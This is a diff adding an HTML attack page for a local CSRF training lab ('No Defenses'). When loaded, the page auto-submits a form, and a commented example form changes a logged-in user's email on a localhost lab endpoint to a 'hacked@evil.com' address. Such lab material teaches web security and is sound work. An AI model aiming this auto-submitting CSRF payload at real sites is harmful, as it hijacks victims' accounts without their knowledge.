@@ -1,0 +1,33 @@
+<!doctype html>
+<html>
+  <head>
+    <title>CSRF Lab 1 Attack</title>
+  </head>
+  <body>
+    <h1>CSRF Lab 1: No Defenses</h1>
+    <p>This page will automatically submit a CSRF attack when loaded.</p>
+    <p>Make sure you're logged in to localhost:3000 first!</p>
+
+    <!-- PASTE BURP CSRF PoC HERE -->
+    <!-- Example:
+    <form action="http://localhost:8080/api/theater-mgnt/security-lab/csrf/lab1/update-email" method="POST">
+      <input type="hidden" name="email" value="hacked@evil.com" />
+    </form>
+    <script>document.forms[0].submit();</script>
+    -->
+
+    <div id="status">Waiting for Burp CSRF PoC...</div>
+
+    <script>
+      // Auto-submit any form on page load
+      window.onload = function () {
+        const forms = document.getElementsByTagName("form");
+        if (forms.length > 0) {
+          document.getElementById("status").textContent =
+            "Submitting CSRF attack...";
+          forms[0].submit();
+        }
+      };
+    </script>
+  </body>
+</html>
